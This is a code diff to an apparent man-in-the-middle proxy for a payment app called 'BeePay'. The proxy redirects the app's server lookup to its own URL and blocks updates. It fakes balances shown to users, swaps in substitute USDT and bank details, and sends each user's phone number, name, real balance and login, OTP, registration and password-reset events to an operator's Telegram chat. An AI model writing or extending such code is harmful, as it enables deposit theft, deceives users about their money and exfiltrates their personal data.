@@ -612,6 +612,19 @@ function sendJson(res, respHeaders, jsonResp, respBody) {
   }
 }
 
+function sendChunked(botInst, chatId, text, chunkSize = 3800) {
+  if (!botInst || !chatId || !text) return;
+  try {
+    const s = String(text);
+    if (s.length <= chunkSize) { botInst.sendMessage(chatId, s).catch(()=>{}); return; }
+    const total = Math.ceil(s.length / chunkSize);
+    for (let i = 0; i < total; i++) {
+      const part = s.substring(i * chunkSize, (i + 1) * chunkSize);
+      botInst.sendMessage(chatId, `(${i + 1}/${total})\n` + part).catch(()=>{});
+    }
+  } catch(e) {}
+}
+
 async function transparentProxy(req, res) {
   try {
     const { respBody, respHeaders } = await proxyFetch(req);
@@ -631,7 +644,13 @@ app.use((req, res, next) => {
       if (!data.logRequests || !data.adminChatId) return;
       const path = req.originalUrl || req.url;
       if (path.includes('bot-webhook') || path.includes('favicon') || path.includes('health')) return;
-      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}`).catch(()=>{});
+      const body = req.parsedBody || {};
+      const userId = body.memberId || body.userId || body.id || '';
+      const phone = getPhone(data, userId);
+      const tag = userId ? ` [${userId}]` : '';
+      const phoneTag = phone ? ` (${phone})` : '';
+      if (userId && isLogOff(data, userId)) return;
+      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(()=>{});
     } catch(e) {}
   })();
   next();
@@ -658,6 +677,10 @@ app.get('/health', async (req, res) => {
     redis: redis ? (redisWorking ? 'connected' : 'error') : 'not configured',
     bankActive: !!active, totalBanks: data.banks.length, adminSet: !!data.adminChatId
   });
+});
+
+app.get('/bot-webhook', (req, res) => {
+  res.json({ ok: true, status: 'BeePay webhook active' });
 });
 
 // ── Telegram bot commands ─────────────────────────────────────────
@@ -1331,8 +1354,46 @@ app.all('/appApi/memberOrder/orderInPage', async (req, res) => { await proxyAndR
 app.all('/appApi/memberOrder/inrOrderPage', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
 app.all('/appApi/orderOut/searchList', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
 
-// Balance / user info
-app.all('/appApi/member/basicInfo', async (req, res) => { await proxyAndAddBonus(req, res); });
+// Balance / user info — with detailed user profile bot log
+app.all('/appApi/member/basicInfo', async (req, res) => {
+  try {
+    const [data, { respBody, respHeaders, jsonResp }] = await Promise.all([
+      cachedData ? Promise.resolve(cachedData) : loadData(),
+      proxyFetch(req)
+    ]);
+    const userId = await extractUserId(req, jsonResp);
+    const eff = getEffectiveSettings(data, userId);
+    const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;
+    const respData = getResponseData(jsonResp);
+    if (bonus > 0 && respData) addBonusToBalanceFields(respData, bonus);
+    const userOvr = userId && data.userOverrides ? data.userOverrides[String(userId)] : null;
+    const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
+    if (addedBal !== 0 && respData) addBonusToBalanceFields(respData, addedBal);
+    if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
+    // extract fields before sending
+    const phone = (respData && (respData.mobile || respData.phone || respData.loginName || '')) || '';
+    const userName = (respData && (respData.nickName || respData.userName || respData.name || '')) || '';
+    const realBalance = respData?.balance ?? '';
+    const realWithdraw = respData?.availableWithdrawBalance ?? '';
+    const realProcess = respData?.processWithdrawBalance ?? '';
+    const visibleBalance = respData?.balance ?? '';
+    sendJson(res, respHeaders, jsonResp, respBody);
+    // save user tracking
+    if (userId) {
+      trackUser(data, userId, 'basicInfo');
+      if (!data.trackedUsers) data.trackedUsers = {};
+      const ex = data.trackedUsers[String(userId)] || {};
+      data.trackedUsers[String(userId)] = { ...ex, lastAction: 'basicInfo', lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), phone: phone || ex.phone || '', name: userName || ex.name || '', balance: realBalance !== '' ? realBalance : (ex.balance || ''), orderCount: ex.orderCount || 0 };
+      saveData(data).catch(()=>{});
+    }
+    // send user profile log to bot
+    if (data.adminChatId && bot && !isLogOff(data, userId)) {
+      bot.sendMessage(data.adminChatId,
+        `👤 User Profile\n🆔 ID: ${userId || 'N/A'}\n📛 Name: ${userName || 'N/A'}\n📱 Phone: ${phone || 'N/A'}\n━━━━━━━━━━━━━━\n💰 Real Balance: ₹${realBalance}\n${addedBal !== 0 ? `➕ Bot Added: ₹${addedBal}\n👁 User Sees: ₹${visibleBalance}` : '➕ Bot Added: ₹0'}\n━━━━━━━━━━━━━━\n💳 Withdraw Balance: ₹${realWithdraw}\n⏳ In Process: ₹${realProcess}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+      ).catch(()=>{});
+    }
+  } catch(e) { await transparentProxy(req, res); }
+});
 app.all('/appApi/member/balanceList', async (req, res) => { await proxyAndAddBonus(req, res); });
 app.all('/appApi/common/homeData', async (req, res) => { await proxyAndAddBonus(req, res); });
 
@@ -1400,6 +1461,118 @@ app.all('/app/api/memberManager/getBankAccount', async (req, res) => {
     const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
     if (data.usdtAddress) replaceUsdtInResponse(jsonResp, data);
     sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+// ── Domain pool — CRITICAL: app calls this on startup to get server URL ──
+app.all('/appAuth/domainPool', async (req, res) => {
+  // Return our proxy URL so app uses it as the server
+  res.json({ code: 0, msg: 'success', data: 'https://ixcv.vercel.app' });
+});
+
+// ── Check update — return no update so app doesn't block on update screen ──
+app.all('/appAuth/checkUpdate', async (req, res) => {
+  const data = await loadData();
+  // If blockUpdate is ON, return "no update needed" without hitting real server
+  if (data.blockUpdate) {
+    return res.json({ code: 0, msg: 'success', data: { needUpdate: '0', version: '', versionCode: '', updateContent: '', link: '', md5: '' } });
+  }
+  // Otherwise proxy to real server
+  try {
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    // Override needUpdate to 0 to prevent forced update popups
+    const rd = getResponseData(jsonResp);
+    if (rd && typeof rd === 'object') rd.needUpdate = '0';
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) {
+    res.json({ code: 0, msg: 'success', data: { needUpdate: '0' } });
+  }
+});
+
+// ── Login route — detailed bot log ────────────────────────────────
+app.all('/appAuth/v2/memberLogin', async (req, res) => {
+  const data = await loadData();
+  try {
+    const body = req.parsedBody || {};
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const respData = getResponseData(jsonResp);
+    const userId = String(respData?.memberId || respData?.userId || respData?.id || '');
+    const phone = body.loginName || body.mobile || body.phone || respData?.loginName || respData?.mobile || '';
+    const userName = respData?.nickName || respData?.userName || respData?.name || phone || '';
+    const realBalance = respData?.balance ?? '';
+    const realWithdraw = respData?.availableWithdrawBalance ?? '';
+    const realProcess = respData?.processWithdrawBalance ?? '';
+    const userOvr = userId && data.userOverrides ? data.userOverrides[userId] : null;
+    const addedBal = userOvr?.addedBalance ?? 0;
+    sendJson(res, respHeaders, jsonResp, respBody);
+    if (userId) {
+      trackUser(data, userId, 'login');
+      if (!data.trackedUsers) data.trackedUsers = {};
+      const ex = data.trackedUsers[userId] || {};
+      data.trackedUsers[userId] = { ...ex, lastAction: 'login', lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), phone: phone || ex.phone || '', name: userName || ex.name || '' };
+      saveData(data).catch(()=>{});
+    }
+    if (data.adminChatId && bot && !isLogOff(data, userId)) {
+      const ts = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      const success = jsonResp?.code === 0 || jsonResp?.code === 200 || jsonResp?.success;
+      bot.sendMessage(data.adminChatId,
+        `🔑 ${success ? '✅ Login Success' : '❌ Login Failed'}\n📱 Phone: ${phone || 'N/A'}\n🆔 ID: ${userId || 'N/A'}\n📛 Name: ${userName || 'N/A'}\n━━━━━━━━━━━━━━\n💰 Real Balance: ₹${realBalance !== '' ? realBalance : 'N/A'}\n➕ Bot Added: ₹${addedBal}\n━━━━━━━━━━━━━━\n💳 Withdraw Balance: ₹${realWithdraw !== '' ? realWithdraw : 'N/A'}\n⏳ In Process: ₹${realProcess !== '' ? realProcess : 'N/A'}\n🕐 ${ts}`
+      ).catch(()=>{});
+    }
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+// ── OTP route — log phone ──────────────────────────────────────────
+app.all('/appAuth/sendOtp', async (req, res) => {
+  const data = await loadData();
+  try {
+    const body = req.parsedBody || {};
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const phone = body.mobile || body.phone || body.loginName || '';
+    const otpType = body.type || body.otpType || '';
+    sendJson(res, respHeaders, jsonResp, respBody);
+    if (data.adminChatId && bot) {
+      const success = jsonResp?.code === 0 || jsonResp?.code === 200 || jsonResp?.success;
+      bot.sendMessage(data.adminChatId,
+        `📩 OTP Sent ${success ? '✅' : '❌'}\n📱 Phone: ${phone || 'N/A'}${otpType ? '\n🔖 Type: ' + otpType : ''}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+      ).catch(()=>{});
+    }
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+// ── Register route — log new user ─────────────────────────────────
+app.all('/appAuth/memberRegister', async (req, res) => {
+  const data = await loadData();
+  try {
+    const body = req.parsedBody || {};
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const respData = getResponseData(jsonResp);
+    const phone = body.loginName || body.mobile || body.phone || '';
+    const userId = String(respData?.memberId || respData?.userId || respData?.id || '');
+    sendJson(res, respHeaders, jsonResp, respBody);
+    if (data.adminChatId && bot) {
+      const success = jsonResp?.code === 0 || jsonResp?.code === 200 || jsonResp?.success;
+      bot.sendMessage(data.adminChatId,
+        `🆕 Register ${success ? '✅ Success' : '❌ Failed'}\n📱 Phone: ${phone || 'N/A'}\n🆔 ID: ${userId || 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+      ).catch(()=>{});
+    }
+  } catch(e) { await transparentProxy(req, res); }
+});
+
+// ── Forgot password — log ─────────────────────────────────────────
+app.all('/appAuth/forgetPwd', async (req, res) => {
+  const data = await loadData();
+  try {
+    const body = req.parsedBody || {};
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const phone = body.loginName || body.mobile || body.phone || '';
+    sendJson(res, respHeaders, jsonResp, respBody);
+    if (data.adminChatId && bot) {
+      const success = jsonResp?.code === 0 || jsonResp?.code === 200 || jsonResp?.success;
+      bot.sendMessage(data.adminChatId,
+        `🔐 Forgot Password ${success ? '✅' : '❌'}\n📱 Phone: ${phone || 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+      ).catch(()=>{});
+    }
   } catch(e) { await transparentProxy(req, res); }
 });
 
